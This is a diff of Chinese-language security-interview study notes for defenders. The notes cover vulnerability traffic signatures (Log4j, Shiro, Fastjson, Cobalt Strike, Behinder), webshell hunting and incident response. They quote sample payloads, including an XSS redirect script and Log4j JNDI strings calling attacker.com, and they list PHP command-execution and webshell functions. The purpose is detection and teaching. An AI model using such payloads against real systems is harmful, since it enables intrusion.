@@ -649,7 +649,7 @@ Web应用允许用户将页面内容导出为PDF，这通常通过HTML渲染引�
 <p>利用XSS触发SSRF。用户个人资料处存在存储型XSS，用户设置中存在SSRF漏洞,在个人简介中注入XSS Payload</p>
 <pre><code>&lt;script&gt;document.location='http://internal-app.local'&lt;/script&gt;
 </code></pre>
-<p>管理员浏览该用户个人资料时，浏览器执行恶意脚本。浏览器代表管理员向服务器的SSRF点发起请求。服务器解析此请求并向内网127.0.0.1:8080发起请求</p>
+<p>管理员浏览该用户个人资料时，浏览器执行恶意脚本。浏览器代表管理员向服务器的SSRF点发起请求。服务器解析此请求并向内网地址发起请求</p>
 <p>4、对于中间件漏洞，如tomcat、nginx、weblogic、apache你知道哪些？<br />
 Weblogic弱口令漏洞 /console<br />
 Weblogic任意文件上传CVE-2018-2894漏洞 /ws_utc/config.do<br />
@@ -674,33 +674,8 @@ RDP 3389,SMB 445,SSH 22,FTP 21,MySQL 3306,Redis 6379,mssql 1433,Telnet 23,RPC 13
 8、给你一个小程序你要如何打，思路是什么？<br />
 9、shiro 漏洞是什么？流量特征是什么？550和721区别？<br />
 10、fastjson漏洞是什么？流量特征什么？不出网怎么打？不同版本如何绕过呀？说一些例子。</p>
-<p>11、log4j 漏洞是什么？请求包响应包流量特征什么？讲一下原理，告警攻击成功如何判断，dns外带怎么看。<br />
-Log4j 漏洞的核心在于“日志记录+JNDI处理”。判定成功的关键在于追踪受害机器是否主动发起过 LDAP/RMI 的外部通信</p>
-<p>Log4j2 在处理日志信息时，如果允许记录用户输入的内容，且该内容包含特定格式的字符串（Lookup功能），就会触发 JNDI注入，进而执行远程代码<br />
-请求包特征:Payload 包含 jndi 和相关的协议名（ldap, rmi, dns, ldaps 等）<br />
-请求包格式：${jndi:ldap://&hellip;}、${jndi:rmi://&hellip;}、${jndi:dns://&hellip;}<br />
-响应包特征:<br />
-服务端尝试连接外部 LDAP 服务器的信息<br />
-响应体中发现异常错误信息<br />
-内部网络，可能会收到 DNS 超时请求</p>
-<p>告警攻击成功如何判断<br />
-方向判断：<br />
-攻击者主动扫描，一般为未打补丁的尝试<br />
-针对内网资源，且确实产生了流量，需要重点关注<br />
-流量确认：<br />
-LDAP/RMI 连接：查看告警发生后，受害机器是否向恶意域名或恶意 IP 发起了主动的外连<br />
-响应时间：攻击成功通常会有一定延迟<br />
-验证payload：尝试分析告警包内容，看是否存在恶意的类名或者包含复杂的 jndi 嵌套</p>
-<p>DNS外带<br />
-特征：流量中出现 dnslog.cn 或攻击者搭建的恶意 DNS 服务器域名（例如 xxx.dnslog.cn）的查询<br />
-DNS 请求流：<br />
-受害机器收到 ${jndi:dns://://attacker.com}<br />
-机器解析 ://attacker.com 的域名，发送 DNS 查询</p>
-<p>如何看dns外带<br />
-搜索 dns 协议包中，包含 ${jndi 和常用 DNSLog 域名的请求<br />
-关注 nslookup、dig 等高频的域名查询流量</p>
 <p>12、struts2漏洞流量特征是什么？</p>
-<p>msf的流量特征是什么<br />
+<p><strong>msf的流量特征是什么</strong><br />
 默认使用4444端口作为反向连接端口<br />
 连接建立后，MSF 会发送一个特定的 4 字节数据</p>
 <p>14、可以说一下cs流量特征是什么？<br />
@@ -732,24 +707,25 @@ URL结构：URL路径设计成模仿正常网站资源，但实际上用于命�
 其他特征：<br />
 User-Agent 字符串：可能使用非典型的UA字符串，或者频繁更换以逃避检测。<br />
 会话保持与迁移：攻击者可能会通过进程注入或远程线程创建来维持持久性，并尝试迁移到更稳定的系统进程中执行命令。</p>
-<p>15、内存马有哪几种类型，如何查杀内存马？<br />
-servlet-api型（通过命令执行等方式动态注册一个新的listener、filter或者servlet，从而实现命令执行等功能。特定框架、容器的内存马原理与此类似，如spring的controller内存马，tomcat的valve内存马），字节码增强型（通过java的instrumentation动态修改已有代码，从而实现命令执行等功能）。<br />
-查看检查服务器web日志，查看有无可疑的 web 访问日志，比刘说 filter 或者listener 类型的内存马，会有大量url请求路径相同但是附带不同参数的记录，或者页面本身并不存在但是返回 200的请求，通过查找返回 200的urll路径对比 web 目录下是否真实文件，如不存在大概率是内存马，如果Web日志中并未发现异常，可以排查是否为中间件漏洞导致代码执行注入内存马，中间件日志查看是否有可疑的报错。根据注入时间和方法，业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过 webshell，排查框架漏洞，反序列化漏洞。查看是否有类似哥斯拉、冰蝎特征的urｌ清求，哥斯拉和冰蝎的内存马注入流量特征与普通webshell的流量特征基本差不多</p>
-<p>16、安全设备面对大量攻击的时候要如何处置？</p>
-<p>19、详细应急流程+命令+实际案例</p>
-<p>20、</p>
+<p><strong>内存马有哪几种类型，如何查杀内存马</strong><br />
+servlet-api型（通过命令执行等方式动态注册一个新的listener、filter或者servlet，从而实现命令执行等功能。特定框架、容器的内存马原理与此类似，如spring的controller内存马，tomcat的valve内存马）。<br />
+字节码增强型（通过java的instrumentation动态修改已有代码，从而实现命令执行等功能）。<br />
+查看检查服务器web日志，查看有无可疑的 web 访问日志，比如说 filter 或者listener 类型的内存马，<br />
+会有大量url请求路径相同但是附带不同参数的记录，或者页面本身并不存在但是返回 200的请求，通过查找返回 200的urll路径对比 web 目录下是否真实文件，如不存在大概率是内存马，<br />
+如果Web日志中并未发现异常，可以排查是否为中间件漏洞导致代码执行注入内存马，中间件日志查看是否有可疑的报错。<br />
+根据注入时间和方法，业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过 webshell，<br />
+排查框架漏洞，反序列化漏洞。查看是否有类似哥斯拉、冰蝎特征的urｌ清求，哥斯拉和冰蝎的内存马注入流量特征与普通webshell的流量特征基本差不多</p>
+<p><strong>安全设备面对大量攻击的时候要如何处置</strong><br />
+封禁攻击源IP 流量清洗 限制访问频率 临时封禁特定地区的IP</p>
 <p>shiro反序列化原理+特征：<br />
 Apache Shiro 是一个强大易用的 Java 安全框架，提供了认证、授权、加密和会话管理等功能，对于任何一个应用程序，Shiro 都可以提供全面的安全管理服务。在Apache Shiro&lt;=1.2.4版本中AES加密时采用的key是硬编码在代码中的，于是我们就可以构造RememberMe的值，然后让其反序列化执行<br />
 特征1cookie中含有rememberMe字段</p>
-<p>21、是否做过互联网资产测绘</p>
-<p>22、告警降噪</p>
 <p>17、在使用安全设备如何识别误报和真实攻击？<br />
 验证告警来源与情报关联<br />
 深入分析事件详情与上下文<br />
 基于“攻击链”进行关联分析</p>
 <p>23、看过哪些安全设备<br />
 安恒大数据AiLPHA</p>
-<p>24、</p>
 <p>25、用过哪些态势感知<br />
 奇安信 网神态势感知与安全运营平台（NGSOC）<br />
 阿里云 云盾态势感知<br />
@@ -762,21 +738,13 @@ Apache Shiro 是一个强大易用的 Java 安全框架，提供了认证、授�
 统计攻击ip出现的次数和频率可能是扫描器，暴力破解<br />
 根据ip线索筛查相关日志<br />
 根据攻击时间筛查相关日志</p>
-<p>28、发现的漏洞，设备抓到的漏洞，安全设备上的流量特征</p>
-<p>29、遇到webshell怎么处理</p>
-<p>30、告警多怎么优化<br />
-1设备规则导致的，规则过于简单粗暴，需要优化告警规则<br />
-2正常业务触发的，通过白名单或者沟通厂商修改业务</p>
-<p>PHP命令执行函数有哪些<br />
-system() exec() shell_exec() passthru() popen() proc_open() pcntl_exec()<br />
-代码执行函数<br />
-eval() assert()<br />
-数据库命令执行函数<br />
+<p><strong>数据库命令执行函数</strong><br />
 MSSQL：xp_cmdshell sp_OACreate<br />
 Oracle：DBMS_JAVA<br />
 MySQL：UDF</p>
 <p><strong>告警层面的事件以前处理过哪些？这个问的就是出现事件后的上报处置流程</strong><br />
 国家网络安全事件应急预案-网络信息安全事件可分为七类四个等级<br />
+告警分析-剧本处置-验证恢复-复盘总结<br />
 实例：<br />
 核心业务系统中断或硬件设备故障<br />
 迅速定位故障节点，启用备用设备或线路-防火墙故障，导入备份配置并替换设备-交换机故障，切换备用设备并恢复网络访问-上级网络故障，立即上报并协助恢复<br />
@@ -787,7 +755,12 @@ MySQL：UDF</p>
 外网遭遇拒绝服务攻击<br />
 防火墙封堵攻击IP-调整DNS解析进行分流-保存日志-必要时断网并报警-联合相关部门协同处置<br />
 外部电源中断<br />
-切换备用供电线路-查明断电原因-短时停电使用UPS-长时停电按序关闭设备</p>
+切换备用供电线路-查明断电原因-短时停电使用UPS-长时停电按序关闭设备<br />
+wps文档中心未授权访问-弱口令-edge浏览器静默扫描磁盘</p>
+<p><strong>发现的漏洞，设备抓到的漏洞，安全设备上的流量特征</strong><br />
+wps文档中心未授权访问 open/v6/api/etcd/operate<br />
+弱口令<br />
+edge浏览器静默扫描磁盘</p>
 <p><strong>做没做过互联网资产测绘</strong><br />
 传统方法：通过访谈，收集防火墙映射情况，手工梳理，黑盒测试，开源情报社区，fofa，鹰图，爱企查，社工库<br />
 发展到现在，借助EASM平台：<br />
@@ -820,8 +793,67 @@ MySQL：UDF</p>
 1.请求中都包含Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8<br />
 2.响应中都包含Cache-Control: no-store, no-cache, must-revalidate<br />
 3.cookie后面带了分号<br />
-4.整个响应包的结构体征为：md5前十六位+base64+md5后十六位</p>
-<p><strong>fastjsion 漏洞特征 流量特征 攻击成功特征 漏洞利用无回显示如何判断成功 不出网如何利用</strong><br />
+4.整个响应包的结构体征为：md5前十六位+base64+md5后十六位<br />
+5.@session_start(); - 开启一个会话。<br />
+6.@set_time_limit(0); - 设置脚本执行时间为无限。<br />
+7.@error_reporting(0); - 关闭所有错误报告。</p>
+<p><strong>webshell 处置实例和思路</strong><br />
+同事反馈运营中心监测到区域某用户网站疑似被植入webshell<br />
+是一个非常标准的冰蝎<br />
+看一下上传时间，中午，正常黑客谁这样？<br />
+日志取了出来，根据jsp马的文件名来过滤<br />
+只有post相关的操作，因此怀疑是通过/visualizedPlatform/这个路径进行上传的<br />
+过滤visualizedPlatform相关的日志，看到大量的webshell扫描日志<br />
+后面就都是上传成功以后的操作了<br />
+根据日志里面的分析，推测是通过/visualizedPlatform/这个路径上传进来<br />
+户沟通了一下，问一下有没有相关的路径<br />
+用户直接扔过来一个 /visualizedPlatform/logui.htm<br />
+分析了一下日志，在被上传webshell前期有test登录成功的日志<br />
+看了一下日志，是通过test用户上传webshell的<br />
+和用户沟通了一下，用户反馈是昨天有等保测评公司进行渗透测试上传的webshell<br />
+没有及时删除，一场乌龙事件<br />
+回过头再看看webshell里面的密码是等保测评公司名简写</p>
+<p><strong>WebShell执行系统命令的函数</strong><br />
+PHP: eval(), system(), exec(), shell_exec(), passthru(), assert(), base64_decode()<br />
+ASP: Execute(), Eval(), CreateObject()<br />
+JSP: Runtime.getRuntime().exec()<br />
+WebShell编码和解码的函数<br />
+eval(base64_decode(&rsquo;encoded_string&rsquo;));<br />
+WebShell文件操作的函数<br />
+PHP: fopen(), fwrite(), file_get_contents(), file_put_contents()<br />
+ASP: FileSystemObject<br />
+WebShell网络操作的函数<br />
+PHP: fsockopen(), curl_exec(), file_get_contents(&lsquo;http://&hellip;&rsquo;)<br />
+ASP: WinHttp.WinHttpRequest</p>
+<p><strong>命令WebShell查找</strong><br />
+find ./ type f -name &ldquo;*.aspx&rdquo; | xargs grep &ldquo;eval(&rdquo;<br />
+其实这个把html目录打包之后拿去D盾扫描会发现四个php全给扫描出来了</p>
+<p><strong>log4j 漏洞特征 流量特征 攻击成功特征 漏洞利用无回显示如何判断成功 不出网如何利用</strong><br />
+Log4j 漏洞的核心在于“日志记录+JNDI处理”。判定成功的关键在于追踪受害机器是否主动发起过 LDAP/RMI 的外部通信</p>
+<p>Log4j2 在处理日志信息时，如果允许记录用户输入的内容，且该内容包含特定格式的字符串（Lookup功能），就会触发 JNDI注入，进而执行远程代码<br />
+请求包特征:Payload 包含 jndi 和相关的协议名（ldap, rmi, dns, ldaps 等）<br />
+请求包格式：${jndi:ldap://&hellip;}、${jndi:rmi://&hellip;}、${jndi:dns://&hellip;}<br />
+响应包特征:<br />
+服务端尝试连接外部 LDAP 服务器的信息<br />
+响应体中发现异常错误信息<br />
+内部网络，可能会收到 DNS 超时请求</p>
+<p>告警攻击成功如何判断<br />
+方向判断：<br />
+攻击者主动扫描，一般为未打补丁的尝试<br />
+针对内网资源，且确实产生了流量，需要重点关注<br />
+流量确认：<br />
+LDAP/RMI 连接：查看告警发生后，受害机器是否向恶意域名或恶意 IP 发起了主动的外连<br />
+响应时间：攻击成功通常会有一定延迟<br />
+验证payload：尝试分析告警包内容，看是否存在恶意的类名或者包含复杂的 jndi 嵌套</p>
+<p>DNS外带<br />
+特征：流量中出现 dnslog.cn 或攻击者搭建的恶意 DNS 服务器域名（例如 xxx.dnslog.cn）的查询<br />
+DNS 请求流：<br />
+受害机器收到 ${jndi:dns://://attacker.com}<br />
+机器解析 ://attacker.com 的域名，发送 DNS 查询</p>
+<p>如何看dns外带<br />
+搜索 dns 协议包中，包含 ${jndi 和常用 DNSLog 域名的请求<br />
+关注 nslookup、dig 等高频的域名查询流量</p>
+<p><strong>fastjsion 漏洞特征 流量特征 攻击成功特征 漏洞利用无回显示如何判断成功 不出网如何利用用</strong><br />
 fastjson在解析json对象时，会使用autoType实例化某一个具体的类，并调用set/get方法访问属性。<br />
 漏洞出现在Fastjson autoType处理json对象时，没有对@type字段进行完整的安全性验证，我们可以传入危险的类并调用危险类连接远程RMI服务器，通过恶意类执行恶意代码，进而实现远程代码执行漏洞。<br />
 特征1根据返回包判断，json数据里有恶意代码片段，@type 指定恶意的类<br />
